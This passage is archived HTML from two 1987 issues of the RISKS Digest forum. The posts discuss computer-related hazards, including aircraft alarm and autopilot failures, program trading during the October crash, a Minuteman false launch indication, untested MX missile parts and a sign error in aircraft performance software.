       to check for both conditions and then generate a new, unambiguous, 
       "coffin corner" alarm.  What is cumbersome and risky for a mechanical 
       system is much easier and hence perhaps appropriate for digital
       technology.  The use of digital computers to detect, interpret, and
       indicate  conditions caused by the interaction of multiple factors
       is a chance to reduce risk.  

</PRE>
<HR><H3><A NAME="subj6.2">
Aircraft control systems
</A>
</H3>
<address>
&lt;<A HREF="mailto:">

</A>&gt;
</address>
<i>

</i><PRE>
Date: Sat, 31 Oct 87 14:59:11 EST
From: Joe Morris (jcmorris@mitre.arpa) &lt;jcmorris@mitre.arpa&gt;

Matt Jaffe's comments are well taken, but I would like to add a few closing
notes:
 
o His comments about "coffin corner" are correct.  From what I've read (no,
  I'm not a heavy-iron pilot) the best efficiency can generally be found
  where the Mach buffet meets the stall warning.  One mark of a good pilot 
  is the ability to find the best compromise between performance and safety
  margin.
 
o The 727 crash I referred to, however, involved a *false* high-speed warning.
  The cockpit instruments indicated an airspeed of 420 kt at 24,800 feet msl
  with a rate of climb of 6,500 feet per minute.  (not 30,000 feet...my error)
  This is far above the performance possible for the aircraft.  The readings
  were consistent with the pitot heads becoming blocked as the aircraft climbed
  through 16,000 feet.

o Finally, the integration of various sources of data to produce situation-
  specific alarms is not only a good idea, but is being done in various
  implementations already.  (I assume that someone is working on a "coffin
  corner" warning; I'm not in a position to routinely see such stuff.)  the
  problem is that regardless of the way in which data is processed, the GIGO
  principle still applies, and the sensors are of necessity still mechanical
  analog devices.  If the primary data source is lying, the user of the data
  may detect that conflicting information is being received, but it's not 
  always possible to determine which of several sources has failed.  The
  Air Florida crash in Washington is another example of exactly this kind
  of situation.

Oh yes...from time to time PGN asks for specific citations of incidents.  The
accident I was citing was Northwest Airlines, Boeing 727-251, N274US, near
Teiells, New York, 1 December 1974.  

</PRE>
<A NAME="subj7"> <IMG SRC="/Images/Lines/hrfadeblue.gif" ALT="---------------------------------------------"></A>
<H3><A NAME="subj7.1">
New encryption method 
</A>
</H3>
<address>
Stevan Milunovic 
&lt;<A HREF="mailto:Milunovic@KL.SRI.Com">
Milunovic@KL.SRI.Com
</A>&gt;
</address>
<i>
Fri 30 Oct 87 09:13:29-PST
</i><PRE>

New Method to Protect Privacy of Computerized Data is Patented,
By STACY V. JONES, c. 1987 N.Y. Times News Service, 31 Oct 1987.

    WASHINGTON - A professor of computer science at a Virginia college has
invented a new method of protecting the privacy of computerized data.
He was granted a patent this week for a cryptographic system that he
describes as much less time consuming than present methods.
    Professor Hito Asai of Christopher Newport College in Newport News
received patent 4,703,503 for what he describes as simple mathematic
computation, technically known as Vector Boolean algebra. The computer
data is enciphered with a long numerical key. According to Asai, an
eavesdropper who attacks the enciphered text would face a
time-consuming process. He plans to offer licenses to computer and
communications manufacturers.
    
    [It may take even less time for the cracker to break, if the
    long key is stored or transmitted in the clear...  Simple
    numerical algorithms may also be subject to inversion.  But this
    is certainly worth investigating.  PGN] 

</PRE>
<A NAME="subj8"> <IMG SRC="/Images/Lines/hrfadeblue.gif" ALT="---------------------------------------------"></A>
<H3><A NAME="subj8.1">
The Stock Market and Program Trading
</A>
</H3>
<address>
Dan
&lt;<A HREF="mailto:db@tcgould.tn.cornell.edu ">
db@tcgould.tn.cornell.edu 
</A>&gt;
</address>
<i>
Fri, 30 Oct 87 05:15:13 EST
</i><PRE>

I used to work on an index arbitrage trading desk and I downloaded and
executed the baskets of stock orders that Mr. Nelson mentions in the Wall
St. Article of Oct. 13, cited a few issues back. He relates a horror story
of someone pushing a button over and over after not getting any response and
buying $100M instead of $25M worth of stock -- I heard this almost two years
ago. Supposedly, the culprit was his printer being offline, and not printing
the orders as they were sent down to the exchange. Currently, software
distributed to brokerage houses by the NYSE has safeguards against this,
such as ignoring input until transmission of a set of orders is complete.
(Not everyone uses this software, though.)

We've also seen share volumes of unheard of proportions. One statistic on TV
was that there were more shares traded last week than in all of 1965.  One
explanation for this is the size of the orders allowed on the exchange's
computer systems. Until last December, an order through DOT (the system which
handles "market" orders) was limited to 2000 shares. Since then, that limit
has been raised to 30,000. With the ability to transmit 100 orders per
minute, one PC AT has the capability to buy or sell up to 3 million shares
per minute. And there are many systems of this type on the street.  (Of
course, that does not mean that these machines are continuously in use or
always dealing in volumes of 30,000 shs/order.)

Are these trades being done completely without human intervention? The
answer is no. The program trading most often referred to is index arbitrage.
Arbitrage takes advantage off price discrepancies of the same good in
different markets, and involves buying the underpriced one and selling the
overpriced one. The most common index arbitrage is done on the S&amp;P 500 and
its corresponding futures. The futures market at the Chicago Mercantile
Exchange still uses open outcry (a la Trading Places) to do business. This
means that, although the computer screen may tell you that now is the time
to buy stocks and sell futures, you'd better make sure your guy in Chicago
did his job and got you a good price on the futures before you push your
button and buy $x million worth of stock. There's substantial monetary risk
involved, and most (if not all) traders would not surrender that decision to
a computer.

The portfolio insurance mentioned a few issues ago deals only in futures,
which again means trading via open outcry, and not with computers. Computers
are used in this strategy for modeling purposes, to tell the portfolio
manager how many futures he should sell to hedge his market exposure.

The only programs I've heard of that may possibly do transactions strictly by
computer are AI programs that try to anticipate very short-term trends in
the market and buy or sell just before the market moves in that direction.
I have not seen these, and don't know how well they work, how widely they
are used, or how "automatic" they are.

As far as I can see, it is just the *ability* to move large amounts of
money in and out of the market very quickly that has changed things.
Computers are still not decision-makers, although they do provide real-
time data and much quicker reaction time to that data. But alot can 
happen in the five minutes it would take to buy or sell all 500 stocks
in the S&amp;P 500. It is the trader who makes the judgement whether 
the transaction could be profitable or not.

It should be noted that the DOT system was not allowed to be used for
index arbitrage programs for the rest of the week after the big drop
last Monday (10/19), yet the daily volume was still much higher than
had ever been seen before. In addition, the President of the Chicago
Mercantile Exchange said that program trading accounted for only about
10% of the volume on the NYSE on 10/19. (New York Times, 10/28, p.D11)
I would take this to mean that the programs were not the driving force
in the market moves, and that it was real selling.

It is possible to do these transactions without computers, but harder
to make them profitable because of the extra time involved when human 
agents are used, and therefore much less likely that they occurred when
using the computers was not allowed. The time windows for the existence
of profitable market spreads are often as short as 30 seconds.

One argument defending program trading's market impact on stock prices is
that it reflects real selling or buying. S&amp;P 500 futures should trade around
their "fair value," which is a premium over the S&amp;P 500 index number based
on interest rates and dividend flow. If buying or selling moves the price of
the futures too far above or below the fair value, arbitragers can take
advantage of this mispricing. But if the price of the futures is pushed
below its fair value, it is because people are selling futures instead of
stocks. If the futures market weren't there, these people would be selling
stocks. It's almost like a simplified Rube Goldberg diagram. Instead of
selling stocks directly, you sell futures which causes someone else to sell
stocks because you have made them overvalued compared to futures.

Once again, computers are blamed without much real knowledge of the process
involved. The conventional wisdom is that program trading is completely
automatic, without human intervention. Yet it is the human trader who is in
control of the two transactions involved -- one talking to a guy
in a futures pit shouting and making strange hand signals, and another
typing a few keystrokes at a keyboard.

Dan Blumenthal

db@tcgould.tn.cornell.edu

</PRE>
<HR><H3><A NAME="subj8.2">
Program trading (Re: RISKS DIGEST 5.51)
</A>
</H3>
<address>
Brent
&lt;<A HREF="mailto:itm!brent@csl.sri.com ">
itm!brent@csl.sri.com 
</A>&gt;
</address>
<i>

</i><PRE>
Date: 29 Oct 87 20:48:11 GMT
Organization: In Touch Ministries, Atlanta, GA
To: &lt;risks@csl.sri.com&gt;

    In light of recent Wall Street instabilities and previous discussion
in RISKS about computer voting fraud, some history might be in order.

    Thomas Alva Edison's first commercial invention was an electric
voting booth.  The votes were electrically and instantly tabulated.
Unfortunately, American politics at the time wasn't interested in either
fast or accurate vote-counting.  The machine was a commercial failure.
Edison vowed then and there never to develop a machine that there 
wasn't a ready market for.  His next invention was the ticker-tape.

    In light of the ensuing century, perhaps we would have been
better off if the response to his machines were reversed :-).

            Brent Laminack  (gatech!itm!brent)

</PRE>
<A NAME="subj9"> <IMG SRC="/Images/Lines/hrfadeblue.gif" ALT="---------------------------------------------"></A>
<H3><A NAME="subj9.1">
Minuteman Missiles...
</A>
</H3>
<address>
John J. McMahon, STX/COBE x4333
&lt;<A HREF="mailto:fasteddy%sdcdcl.span@VLSI.JPL.NASA.GOV ">
fasteddy%sdcdcl.span@VLSI.JPL.NASA.GOV 
</A>&gt;
</address>
<i>
Thu, 29 Oct 87 13:35:34 PST
</i><PRE>
To: risks@csl.sri.com

WTOP, the local all-news radio station in Washington D.C., reported the 
following on 28 October 1987.  Unfortunately, I was riding along in my
car when I heard this, so it isn't verbatim. 

3 years ago, at a SAC missile base in the midwest, a Minuteman III missile
malfunctioned.  The missile was carrying three nuclear warheads, and went
into launch mode.  Technicians couldn't understand what was going on, since 
there was no alert occurring at the time.  Their immediate reaction was to
take a large armored personel carrier (APC) and park it on the missile silo.  
Assuming the silo doors opened, the APC would fall into the silo, and hopefully
stop the missile.  Missiles apparently do not arm their payloads until they are
off the ground.  The report went on to say that the missile did not launch,
and that the fault was tracked to a problem in the guidance system.  The
incident was never reported to the Strategic Air Command, local officials,
or apparently anyone outside the missile base.

According to this, the only way we can stop a malfunctioning missile is
to drop a big 'rock' on it.

John McMahon, FastEddy@Dftnic.Gsfc.Nasa.Gov (Internet), FastEddy@Iafbit(Bitnet)

</PRE>

<IMG SRC="/Images/Lines/hrfadeblue.gif" ALT="---------------------------------------------"><P>
<A HREF="/Risks/5.51.html"><IMG SRC="/Images/Buttons/granite_left.gif" ALT="Previous Issue" WIDTH="30" HEIGHT="30"></A>
<A HREF="/Risks/index.5.html"><IMG SRC="/Images/Buttons/granite_up.gif" ALT="Index" WIDTH="30" HEIGHT="30"></A>
<A HREF="/Risks/5.53.html"><IMG SRC="/Images/Buttons/granite_right.gif" ALT="Next Issue" WIDTH="30" HEIGHT="30"></A>
<A HREF="/Risks"><IMG SRC="/Images/Buttons/granite_i.gif" ALT="Info" WIDTH="30" HEIGHT="30"></A>
<A HREF="/Risks.data/search.html"><IMG SRC="/Images/Buttons/granite_qm.gif" ALT="Searching" WIDTH="30" HEIGHT="30"></A>
<A HREF="mailto:risks@csl.sri.com"><IMG SRC="/Images/Buttons/granite_submit.gif" ALT="Submit Article" WIDTH="30" HEIGHT="30"></A>
<HR>
Report problems with the web pages to <A HREF="mailto:Lindsay.Marshall@newcastle.ac.uk">Lindsay.Marshall@newcastle.ac.uk</A>.
</BODY></HTML>
</DOC>
<DOC>
<DOCNO>WT11-B30-5</DOCNO>
<DOCOLDNO>IA012-000130-B021-290</DOCOLDNO>
<DOCHDR>
http://catless.ncl.ac.uk:80/Risks/5.53.html 128.240.150.127 19970217013953 text/html 24455
HTTP/1.0 200 OK
MIME-Version: 1.0
Date: Mon, 17 Feb 1997 01:38:21 GMT
Server: phttpd/0.99.72
Content-Type: text/html
</DOCHDR>
<HTML><HEAD><TITLE>The Risks Digest Volume 5: Issue 53</TITLE>
<LINK REL="Prev" HREF="/Risks/5.52.html">
<LINK REL="Up" HREF="/Risks/index.5.html">
<LINK REL="Next" HREF="/Risks/5.54.html">
<LINK REL="Help" HREF="/Risks">
<LINK REV="made" HREF="mailto:Lindsay.Marshall@newcastle.ac.uk">
</HEAD><BODY><HR>
<A HREF="/Risks/5.52.html"><IMG SRC="/Images/Buttons/granite_left.gif" ALT="Previous Issue" WIDTH="30" HEIGHT="30"></A>
<A HREF="/Risks/index.5.html"><IMG SRC="/Images/Buttons/granite_up.gif" ALT="Index" WIDTH="30" HEIGHT="30"></A>
<A HREF="/Risks/5.54.html"><IMG SRC="/Images/Buttons/granite_right.gif" ALT="Next Issue" WIDTH="30" HEIGHT="30"></A>
<A HREF="/Risks"><IMG SRC="/Images/Buttons/granite_i.gif" ALT="Info" WIDTH="30" HEIGHT="30"></A>
<A HREF="/Risks.data/search.html"><IMG SRC="/Images/Buttons/granite_qm.gif" ALT="Searching" WIDTH="30" HEIGHT="30"></A>
<A HREF="mailto:risks@csl.sri.com"><IMG SRC="/Images/Buttons/granite_submit.gif" ALT="Submit Article" WIDTH="30" HEIGHT="30"></A>
<HR>
<H1>The Risks Digest Volume 5: Issue 53</H1>
<H2> Monday, 2 November 1987 </H2>
    <H3>Forum on Risks to the Public in Computers and Related Systems</H3>
    <I><A HREF="http://www.acm.org">ACM</A>
Committee on Computers and Public Policy, Peter G. Neumann, moderator</I>
<H2>Contents</H2><DL>
<DT><IMG SRC="/Images/redball.gif" ALT= "o"><A HREF="#subj1">
Re: Risks in intelligent security algorithms 
</A>
<DD>
<A HREF="#subj1.1">
David Redell
</A><br>
<DT><IMG SRC="/Images/redball.gif" ALT= "o"><A HREF="#subj2">
  Danger of typing the wrong password 
</A>
<DD>
<A HREF="#subj2.1">
Scot Wilcoxon
</A><br>
<DT><IMG SRC="/Images/redball.gif" ALT= "o"><A HREF="#subj3">
  Inadvertent Launch 
</A>
<DD>
<A HREF="#subj3.1">
Kenneth R. Jongsma
</A><br>
<DT><IMG SRC="/Images/redball.gif" ALT= "o"><A HREF="#subj4">
  MX Missile guidance computer problems 
</A>
<DD>
<A HREF="#subj4.1">
John Haller
</A><br>
<DT><IMG SRC="/Images/redball.gif" ALT= "o"><A HREF="#subj5">
  Re: Autopilots 
</A>
<DD>
<A HREF="#subj5.1">
Jan Wolitzky
</A><br>
<DT><IMG SRC="/Images/redball.gif" ALT= "o"><A HREF="#subj6">
  Aircraft accident 
</A>
<DD>
<A HREF="#subj6.1">
Peter Ladkin
</A><br>
<DT><IMG SRC="/Images/redball.gif" ALT= "o"><A HREF="#subj7">
  Missiles; predicting disasters 
</A>
<DD>
<A HREF="#subj7.1">
David Chase
</A><br>
<DT><IMG SRC="/Images/redball.gif" ALT= "o"><A HREF="#subj8">
  DISCOVER Uncovered? 
</A>
<DD>
<A HREF="#subj8.1">
Bruce N. Baker
</A><br>
<DT><IMG SRC="/Images/redball.gif" ALT= "o"><A HREF="#subj9">
  TV Clipping Services 
</A>
<DD>
<A HREF="#subj9.1">
Tom Benson [and Charles Youman]
</A><br>
<A HREF="#subj9.2">
 Samuel B. Bassett
</A><br>
</DL>

<A NAME="subj1"> <IMG SRC="/Images/Lines/hrfadeblue.gif" ALT="---------------------------------------------"></A>
<H3><A NAME="subj1.1">
Re: Risks in intelligent security algorithms (RISKS 5.52)
</A>
</H3>
<address>
David Redell
&lt;<A HREF="mailto:redell@src.dec.com ">
redell@src.dec.com 
</A>&gt;
</address>
<i>
Mon, 2 Nov 87 11:10:03 PST
</i><PRE>

Peter Denning reports (5.52) on an annoying rough edge on the San Francisco
Airport's parking lot computer system, which attempted to double charge him
when he re-entered the lot on the same day. I had a similar experience at the
San Jose airport, but in my case, I parked for two consecutive weekends, and 
when I left after the second one, the blasted system tried to charge me for
the week in between! This seems really unforgivable, since it had plenty of
time to both purge the old record and enter the new one. Fortunately, I just
happened to still have the first receipt in my car. Unfortunately, I was in a
hurry, and so did not display Peter's diligence in tracking down the official
"explanation".
                                     [Sounds like the SAME program!  If you 
                                     drive a BMW, Let the Bayer Beware.  PGN]

</PRE>
<A NAME="subj2"> <IMG SRC="/Images/Lines/hrfadeblue.gif" ALT="---------------------------------------------"></A>
<H3><A NAME="subj2.1">
Danger of typing the wrong password
</A>
</H3>
<address>
&lt;<A HREF="mailto:">

</A>&gt;
</address>
<i>

</i><PRE>
Date: 1 Nov 87 15:37:22 CST (Sun)
From: umn-cs!sewilco@datapg.MN.ORG (Scot Wilcoxon)
To: RISKS@csl.sri.com

Yet more from the Program Trader Nelson article (WSJ, Oct 13, pg 39):
	One time, a broker typed in the wrong password (on the Bankers Trust
	computer), which happened to be another broker's password.  "So they
	both had this same list of securities.  I get a call from a broker
	saying, `I'm trying to buy XYZ and it keeps getting bid up out there.`
	We couldn't figure it out.  Then it suddently dawned on us that (two
	different brokers) were working the same list."
Both brokers were getting the same list of stocks to buy and sell, and were
bidding against each other.

Scot E. Wilcoxon	sewilco@DataPg.MN.ORG	{ems,meccts}!datapg!sewilco
Data Progress		Minneapolis, MN, USA	+1 612-825-2607

</PRE>
<A NAME="subj3"> <IMG SRC="/Images/Lines/hrfadeblue.gif" ALT="---------------------------------------------"></A>
<H3><A NAME="subj3.1">
Inadvertent Launch
</A>
</H3>
<address>
&lt;<A HREF="mailto:portal!cup.portal!Kenneth_R_Jongsma@Sun.COM">
portal!cup.portal!Kenneth_R_Jongsma@Sun.COM
</A>&gt;
</address>
<i>

</i><PRE>
Date: Mon Nov  2 17:06:28 1987

In regards to the post that talked about parking a vehicle on top of a
Minuteman III silo to prevent it's launch: I was a Minuteman commander
for several years and had a similar experience. One evening while on
alert, I had a missile report "Launch In Process". This was unusual,
to say the least! It was also not preceded by the usual indications
of a launch. When I called the problem into the base, I received the
reply: "Well sir, keep an eye on it. It's either going to launch or
shut itself down. In either case, there's not a lot we can do about
it." This was not a true statement and probably was the type of         Shortly
thinking that led to the vehicle being placed over the silo at
F.E. Warren. If that did indeed occur, it would be questionable
to it's effect. The silo door is approximately 5 feet of hardened
concrete and is designed to open even when buried under a substantial
amount dirt and rubble.

Inadvertent launch sounds serious, but hold on before you assume
the worst. A subsequent investigation revealed that there was a fire
in the communications rack that reported site status. At no time
were any of the interlocks that prevent accidental launch at risk.
In effect, the missle's status had never changed from the reported
"Strategic Alert".

I have worked with many systems, I would say that none have the number
and well thought out sets of fail safes for both Type I and II
accidental launches. One interesting fact is that no part of the
launch *procedure* for Minuteman or MX is classified. Only recently
have the operational manuals been restricted to offical use and
probably could be obtained under the Freedom of Information Act.

The challenge, of course, is to design, build and test systems that
have an acceptable level of risk.

</PRE>
<A NAME="subj4"> <IMG SRC="/Images/Lines/hrfadeblue.gif" ALT="---------------------------------------------"></A>
<H3><A NAME="subj4.1">
MX Missile guidance computer problems
</A>
</H3>
<address>
&lt;<A HREF="mailto:ihnp4!ihlpl!jhh@ucbvax.Berkeley.EDU">
ihnp4!ihlpl!jhh@ucbvax.Berkeley.EDU
</A>&gt;
</address>
<i>
Mon, 2 Nov 87 19:44:10 PST
</i><PRE>

I'm sure many people will have something to say about Sunday's 60 Minutes
report about untested parts being used in the MX Missiles currently
deployed.  I'll refrain from comparing this to SDI, and stick to the story.

There are three variables that make up a project: quality, budget, and
schedule.  It has been said that it is possible to meet any two of these
objectives, but only at the expense of the third.  It appears that, in the
eyes of lower management, the personal risk of not meeting the schedule was
greater than the risk of manufacturing products that had not been fully
tested.  After all, if the US ever had to use these parts, the individuals
are not likely to be around to face the repercussions of MX missiles landing
in Chicago rather than Moscow.

Although this particular program focused on untested, but certified falsely
as tested, hardware, similar problems exist is software development.
Software developers are loath to have someone else checking to be sure that
they have done all the work they said they have done.  The feeling is that
each individual is trustworthy, and checking work exhibits a lack of trust.
Unfortunately, human nature is such that someone testing an error leg of
code, probably at 2:30 in the morning, is likely to declare themselves done,
as they "know" they did a good job coding the software, and the last 20
error legs they tested had no problems.  Even worse is the case when their
manager is pushing hard to meet a particular schedule, and the project is
understaffed.  The 60 Minutes program showed how hard it is to use auditors
to discover problems when management does not want to know that a problem
exists.  The organizations telling the auditors what to do all had a vested
interest in the project being completed on time.

Any suggestions?   John Haller ihnp4!ihlpl!jhh

</PRE>
<A NAME="subj5"> <IMG SRC="/Images/Lines/hrfadeblue.gif" ALT="---------------------------------------------"></A>
<H3><A NAME="subj5.1">
Re: Autopilots
</A>
</H3>
<address>
&lt;<A HREF="mailto:research!wolit@ucbvax.Berkeley.EDU">
research!wolit@ucbvax.Berkeley.EDU
</A>&gt;
</address>
<i>
Mon, 2 Nov 87 06:33:59 PST
</i><PRE>

Joe Morris is correct in stating that a pilot should be able to
overpower a failed autopilot.  Of course, fighting a bad autopilot is
not the safest way to fly, either.

While not exactly pertinent here -- most general aviation autopilots are
analog, not digital devices, and thus hardly qualify as "computers" by
most people's definition -- a few autopilot "war stories" may be of
interest.

My friend had flown his Grumman Cheetah (a light, single-engine plane)
to a nearby airport for its annual inspection, and the shop offered to
have an instructor fly it back to him afterwards.  Without shutting down,
the instructor slid across to the right seat, and my friend climbed into
the left to fly the instructor back.  (I know it sounds complicated,
but it's a lot easier than setting up a car shuttle.)  He immediately
noticed that the controls felt much stiffer than usual, and mentioned this
to the instructor.  The instructor replied that the shop had probably
tightened up the control cables, and that everything was normal.  My friend
took off and flew to the instructor's airport, disturbed that the usual
light, responsive control feel of the Grumman had been replaced by the
truck-like feel of, say, a Cessna (no flames from Cessna owners, please).
After landing, he went to the shop to complain about this.  The mechanic
came out to the plane, moved the control yoke, and said that it felt fine.
My friend tried it and, sure enough, it moved freely.  Turned out that
the instructor (who usually flew Cessnas) had flown to my friend's airport
with the autopilot engaged, and that my friend had not noticed this during
the run-up and return flight.  The single-axis (roll) autopilot had been
engaged in a navigation-aid tracking mode, but the nav radio had been off
for the short flight, so the autopilot had been busily trying to hold the
ailerons neutral, fortunately without overwhelming success.

The other point I want to raise concerns a particular type of
autopilot (or mode of operation) popular on many corporate jets and turboprops
and heavier piston twins.  This is known as a flight director, and it
involves having the autopilot compute the desired flight path for a
particular maneuver (a missed approach, e.g.), and display on the
artificial horizon -- the primary attitude reference instrument -- a
set of "command bars", which direct the pilot to maintain the appropriate
aircraft attitude.  In other words, the autopilot assumes the
"executive" function, and the pilot serves as a servo motor!  I never
understood why anyone would use such a device.  I read a report of an
accident several years ago in which a corporate plane -- I believe it
was an MU-2, in fact -- took off from National Airport in D.C. and
flew into the river for no other reason than that the flight director
went psychotic and commanded the pilot to do so.  It seems to me that
it's hard enough to remain skeptical of what your instruments are
telling you and maintain a cross-check on their reliability, without
reducing the pilot to the status of a robot, slavishly following
George's orders.

Jan Wolitzky, AT&amp;T Bell Labs, Murray Hill, NJ; 201 582-2998; mhuxd!wolit
(Affiliation given for identification purposes only)

</PRE>
<A NAME="subj6"> <IMG SRC="/Images/Lines/hrfadeblue.gif" ALT="---------------------------------------------"></A>
<H3><A NAME="subj6.1">
aircraft accident 
</A>
</H3>
<address>
Peter Ladkin
&lt;<A HREF="mailto:ladkin@kestrel.ARPA ">
ladkin@kestrel.ARPA 
</A>&gt;
</address>
<i>
Mon, 2 Nov 87 15:03:53 PDT
</i><PRE>

i found the following letter in the 8.1.87 copy of aviation safety.
apart from the deja vu, it raises questions about certification
procedures for light aircraft, does it not? i had understood that
aircraft had to be flown through all the appropriate flight regimes to
validate the data. maybe i am mistaken, and perhaps someone can clarify?

density-altitude is a term used for the `correction' of true altitude for
`non-standard' air temperature (based on the international standard
temperatures and lapse rates used for aircraft design). all pilots are
taught to compute it, and to be aware of it on takeoff from `hot-and-high'
fields. it's a measure of airplane performance, e.g. i have taken off from
grand canyon (6606ft MSL) on a hot day in june when the density altitude was
9300 feet and i expect the airplane to behave according to the handbook's
figures for 9300ft.

the letter is reprinted without permission.  i reproduce the letter in full
because of the apparent legal history.  the grumman aircraft are not
currently in production.

peter ladkin

  (From Donald H. Slavik of Milwaukee, Wisconsin)

  I enjoyed the article in your May 15, 1987 issue regarding the Grumman
  AA-1.  As an attorney, several years ago, I represented the estate of a
  man who was killed in an accident involving this aircraft.  He attempted
  to take off from a 3,000-foot long, 150-foot wide, one-degree uphill
  grass runway in northern Wisconsin.  The aircraft was loaded to maximum
  gross weight and the outside air temperature was about 70 degrees.  The
  aircraft failed to clear trees which were located 1,400 feet past the
  end of the runway.

  My investigation into the background of the aircraft revealed that
  original flight testing for takeoff and climb performance was 
  accomplished at sea level only.  This data was then used as input to
  a computer program to reduce it to data applicable to higher density
  altitudes.  A careful review of the computer program revealed that there
  was a sign error in one of the exponents for the critical equations.
  This caused serious errors in the resulting output data.  Secondly, the
  technical research paper which the computer program was based upon had
  a footnote which was ignored by the manufacturer of the aircraft.  The
  footnote pointed out that these equations were not applicable to
  aircraft with low thrust-to-weight ratios (such as this particular plane).

  We initiated our own set of flight tests under the direction of Michael 
  Antoniou, the consultant referred to in the Aviation Consumer article. 
  These tests, accomplished at the same density altitude as that which 
  existed on the day of the accident, correctly predicted the performance 
  of the aircraft and also matched the impact point in the trees.

  In conclusion, I sincerely believe that the takeoff and climb performance
  data in the pilot's operating handbook is incorrect.

  [End of Letter]

</PRE>
<A NAME="subj7"> <IMG SRC="/Images/Lines/hrfadeblue.gif" ALT="---------------------------------------------"></A>
<H3><A NAME="subj7.1">
Missiles; predicting disasters
</A>
</H3>
<address>
David Chase 
&lt;<A HREF="mailto:acornrc!rbbb@ames.arpa">
acornrc!rbbb@ames.arpa
</A>&gt;
</address>
<i>
Mon, 2 Nov 87 10:13 PST
</i><PRE>

(on faulty missiles)

I find it interesting that the doors are controlled by the missile and not by
the person(s) giving the launch order.  I suppose that this removes one way of
thwarting a launch, but it seems unlikely that agents of the Evil Enemy Empire
would be able to get at the door controls if they were ground-based
(certainly, it is no more likely than them being able to park an APC on top of
the silo).  The trade-offs that our military makes between ensuring a desired
launch and preventing an accidental launch tend to give me the creeps.

(on predicting disasters, and the comment that it didn't really matter)

There is no question that disaster prediction is useless without some advance
preparation.  Since there is a cost to both prediction and preparation, as
soon as the expected cost of disaster X falls (well) below the costs of
prediction and preparation, one stops preparing and predicting.  Consider
hurricane preparation on the West Coast, earthquake preparation on the East
Coast, and snowstorm preparation in the South.  One region's minor disaster is
another region's calamity, and a day or two of warning won't help that much.
Preparation for all these events requires widespread, long-term preparation,
and an occasional "baby disaster" helps enormously to keep people aware and to
test their response.

I find the current administration's early depictions of SDI particularly
amusing in light of this.  Remember the "umbrella"?  Whatever happened to
civil defense?  I recall some interpretation of civil defense as "threatening"
-- does that mean that SDI is not?  On the other hand, civil defense may
whip up emotions in ways that the "umbrella" does not; it's harder to
generate public sentiment for peace and friendship when the public is also
preparing for an attack by the Evil Enemy Empire.  Sigh.  I wish I could
think that this was Reagan's Secret Plan for better relations with Russia.

David

</PRE>
<A NAME="subj8"> <IMG SRC="/Images/Lines/hrfadeblue.gif" ALT="---------------------------------------------"></A>
<H3><A NAME="subj8.1">
DISCOVER Uncovered?
</A>
</H3>
<address>
&lt;<A HREF="mailto:BNBaker@KL.SRI.Com">
BNBaker@KL.SRI.Com
</A>&gt;
</address>
<i>
Mon 2 Nov 87 14:44:51-PST
</i><PRE>

I just received a promotional letter designed to entice me to join Discover
Card Travel Services.  There is a sweepstakes involved in which I may already
be a winner.  I get so excited everytime I read those words.  In other words,
I get excited at least once a day, but this one has a new twist.

The flyer states, "Enter now.  You could be an INSTANT WINNER!  Your dream
vacation stamp bears a unique UPC Symbol.  It will be electronically scanned
to reveal if you are an instant winner!"  It so happens that we have two 
Discover cards for some reason, and I happened to open both envelopes.  I
already mentioned how excited I get and so I was able to get excited twice.
Then I noticed that the UPC symbols were the same on both flyers.  As you
may recall from a couple of issues ago, I have an interest in semantics so
I called Discover Card to learn about this new meaning of the word "unique."
I was told that there is a secret code on the UPC Symbol that makes each one
unique.  The bar codes are identical so there would have to be some special
material in the ink of the winning ones.  If, however, the bar codes differed
on the winners, then the winners would be obvious to those printing them up.
Either way, my entries are not unique, as claimed.  The Discover Card
representative simply gave cute answers back to my questions.

They asked how big my sample size was, so part of the purpose of this is to ask
RISKS readers if they by chance received the same unique set of UPC symbols
that I did, namely Canada 12345 06240, Hawaii 12345 50030, West Germany 12345
02990, Walt Disney World 12345 75740, Colorado 12345 00580, Arizona 12345 10300
If yours are different, please let me know also.

The things that annoy me about this are:
     The aura of electronically scanning the entries to determine who the
     winners are, when in fact that process may not take place.

     The attempt to dispense my concerns by stating that there is a secret code
     on each of the UPC symbols that can only be read by their special
     computer.

The technology is produced by UPC Games of Chicago (no phone listing).  At a
minimum, this appears to be misrepresentation, but I've been notified that I
may already be a winner so many times that this slight twist to the
misrepresentation game should not bother me I suppose.  Does anyone know how
this one supposedly works?

Bruce N. Baker &lt;bnbaker@kl.sri.com&gt;

</PRE>
<A NAME="subj9"> <IMG SRC="/Images/Lines/hrfadeblue.gif" ALT="---------------------------------------------"></A>
<H3><A NAME="subj9.1">
TV Clipping Services
</A>
</H3>
<address>
&lt;<A HREF="mailto:   "Tom Benson 814-238-5277" <T3B@PSUVM>    [BITNET]">
   "Tom Benson 814-238-5277" &lt;T3B@PSUVM&gt;    [BITNET]
</A>&gt;
</address>
<i>
Sun, 1 Nov 87 08:33 EST
</i><PRE>
To:      RISKS@KL.SRI.COM

In <A HREF="/Risks/5.51.html">RISKS-5.51</A> Will Martin asks about TV clipping services.  The best
comprehensive source for network television news is the Vanderbilt
Television News Archive, at Vanderbilt University.  They collect all
national network news (since 1968, I believe), plus some special events.
Full print indexes of this service are available at good research
libraries or from Vanderbilt.  They will provide videotape of specified
stories at, I believe, about $100 per hour of tape.

There are also several commercial clipping services, which charge more
but which also collect such things as local tv news.  They operate in
several major cities, but I have little information about them; I could
find out more if it's of interest.

On the general point, Will is right: these services are a good way
to monitor what the public is hearing about various areas in which
scholars and scientists are interested.

Tom Benson, Penn State University           [Also noted by Charles Youman]

</PRE>
<HR><H3><A NAME="subj9.2">
Video Clips
</A>
</H3>
<address>
Samuel B. Bassett
&lt;<A HREF="mailto:amdcad!well!samlb@hplabs.HP.COM ">
amdcad!well!samlb@hplabs.HP.COM 
</A>&gt;
</address>
<i>
Fri, 30 Oct 87 23:29:39 PST
</i><PRE>

	For the person wondering about being able to get videotapes of TV
programs, I would suggest contacting Bacon's PR &amp; Media Information Services
in Chicago.  They do, certainly do newspaper and magazine clips, and may also
do video clips -- if not, they will likely be willing and able to refer you
to somewhere that can.
	The address and telephone number I have are from 1984, but they do
have an '800' number, and you can get it by dialing 1-800-555-1212 and asking
the AT&amp;T operator.
	Bacon's is a decidedly commercial operation, and is not cheap, but my
experiences with them in '81-'83 were decidedly positive.

</PRE>

<IMG SRC="/Images/Lines/hrfadeblue.gif" ALT="---------------------------------------------"><P>
<A HREF="/Risks/5.52.html"><IMG SRC="/Images/Buttons/granite_left.gif" ALT="Previous Issue" WIDTH="30" HEIGHT="30"></A>
<A HREF="/Risks/index.5.html"><IMG SRC="/Images/Buttons/granite_up.gif" ALT="Index" WIDTH="30" HEIGHT="30"></A>
